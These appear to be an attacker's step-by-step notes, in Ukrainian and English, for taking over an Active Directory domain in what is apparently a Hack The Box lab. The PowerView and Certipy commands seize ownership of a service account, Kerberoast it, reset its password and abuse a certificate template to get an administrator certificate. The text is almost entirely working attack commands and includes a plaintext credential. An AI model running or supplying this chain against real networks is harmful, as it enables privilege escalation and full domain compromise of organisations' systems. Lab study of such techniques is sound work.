## GET HTML HASH 
**get all rights** у ryan є права writeowner над ca_svc
$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force 
$Cred = New-Object System.Management.Automation.PSCredential('SEQUEL\ryan', $SecPassword)
Set-DomainObjectOwner -Credential $Cred -Identity 'CA_SVC' -OwnerIdentity 'SEQUEL\ryan'
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CA_SVC" -PrincipalIdentity "ryan" -Rights All

Перегладаємо сід нашого атакуючого користувача
Get-DomainUser | Where-Object { $_.Name -like "*ryan*" } | Select-Object Name, Objectsid
Переглядаємо права нашої цілі
Get-DomainObjectAcl -Identity 'ca_svc' | Where-Object { $_.ActiveDirectoryRights -eq 'GenericAll' }

kerberosting with powerview
створюємо spn
Set-DomainObject -Identity 'ca_svc' -Set @{serviceprincipalname='mydomain/Testing'}
перевіряємо чи створився spn
Get-DomainUser 'ca_svc' | Select-Object serviceprincipalname
отримуємо квиток
$User = Get-DomainUser 'ca_svc'  
$User | Get-DomainSPNTicket -Credential $Cred

## **Windows PowerShell PowerView — Reset User Password**

$NewPassword = ConvertTo-SecureString 'Password9999' -AsPlainText -Force  
Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $NewPassword
**verification:**
runas /user:sequel.htb\ca_svc cmd.exe

## Using Certify
./Certify.exe find /domain:sequel.htb

certipy template -u ca_svc@sequel.htb -p Password9999  -template DunderMifflinAuthentication -save-old

certipy req -username ca_svc@sequel.htb -password Password9999 -ca sequel-DC01-CA -target sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -dns 10.10.11.51

certipy auth -pfx administrator_10.pfx -domain sequel.htb
далі у відкритому вікні ставимо 0